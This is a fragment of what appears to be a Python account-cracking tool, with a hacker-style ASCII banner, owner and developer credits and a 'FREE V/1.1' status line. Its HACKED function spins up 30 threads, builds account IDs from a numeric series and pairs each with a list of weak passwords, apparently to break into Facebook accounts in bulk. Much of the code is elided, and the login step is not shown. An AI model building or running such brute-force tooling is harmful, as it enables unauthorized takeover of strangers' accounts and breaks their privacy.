...
| |\/| ||    /______|`--. \  _  ||  _  | | | | | | || |/\| |
| |  | || |\ \      /\__/ / | | || | | | |/ /\ \_/ /\  /\  /
\_|  |_/\_| \_|     \____/\_| |_/\_| |_/___/  \___/  \/  \/                                                                                                                                                                                           /1.1
\n---------------------------------
[✪] OWNER      : l GOODNEWS XX SHADOW 
[✪] DEVELOPER  : ASIF 
[✪] STATUS     : FREE [+] V/1.1
...
def HACKED(series):
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        for love in gen:
            ids = SEX + love
            passlist = ["123456", "1234567", "12345678", "123456789"," 000000","1234567890","123123","khan123","singh123","salamkhan","555555","Facebook","mary123","firstname","lastname","0987654321","shadow","jackson","222222","password123","king123"]
